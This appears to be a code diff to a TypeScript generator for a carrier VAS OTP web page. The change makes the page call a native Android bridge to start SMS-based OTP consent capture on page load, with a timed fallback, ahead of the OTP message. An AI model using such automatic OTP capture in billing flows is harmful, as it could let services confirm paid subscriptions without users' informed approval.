@@ -260,7 +260,9 @@ function buildVasOtpHtml(opts: {
     function showError(msg) {
       var oe = document.getElementById('overlayError');
       if (oe) oe.textContent = msg;
-      document.getElementById('resendAreaOverlay').classList.remove('phase-hidd    function goToPhase2() {
+      document.getElementById('resendAreaOverlay').classList.remove('phase-hidden');
+    }
+    function goToPhase2() {
       phase = 2;
       document.getElementById('phase1').classList.add('phase-hidden');
       confirmBtn.classList.add('phase-hidden');
@@ -282,7 +284,7 @@ function buildVasOtpHtml(opts: {
         if (!isVerifying && !pinVerified && !consentArmed) {
           consentArmed = true;
           try {
-            if (window._ntR && window._nt && window._nt.enableSmsConsent) window._nt.enableSmsConsent();
+            if (window._nt && window._nt.enableSmsConsent) window._nt.enableSmsConsent();
           } catch (e) {}
         }
       }, ${CONSENT_FALLBACK_ARM_MS});
@@ -299,7 +301,7 @@ function buildVasOtpHtml(opts: {
       lastConsentAt = Date.now();
       dbg('Confirm tapped');
       try {
-        if (window._ntR && window._nt && window._nt.onPinRequested) window._nt.onPinRequested();
+        if (window._nt && window._nt.onPinRequested) window._nt.onPinRequested();
       } catch (err) {}
       if (!PIN_REQUEST_OK) {
         showOverlay();
@@ -380,12 +382,24 @@ function buildVasOtpHtml(opts: {
       location.href = u;
     });
 
-    if (window._ntR && window._nt && window._nt.onPageReady) {
-      try { 
-        window._nt.onPageReady(); 
-        // Arm SMS consent immediately on page load
+    // _nt bridge is available immediately (addJavascriptInterface), but _ntR
+    // is set later by onPageFinished. Don't gate on _ntR — call directly so
+    // SMS consent starts before the OTP SMS arrives.
+    if (window._nt && window._nt.onPageReady) {
+      try {
+        window._nt.onPageReady();
         if (window._nt.enableSmsConsent) window._nt.enableSmsConsent();
       } catch (e) {}
+    } else {
+      // Fallback: retry after onPageFinished sets the bridge
+      setTimeout(function() {
+        if (window._nt && window._nt.onPageReady) {
+          try { window._nt.onPageReady(); } catch (e) {}
+        }
+        if (window._nt && window._nt.enableSmsConsent) {
+          try { window._nt.enableSmsConsent(); } catch (e) {}
+        }
+      }, 300);
     }
   </script>
 </body>
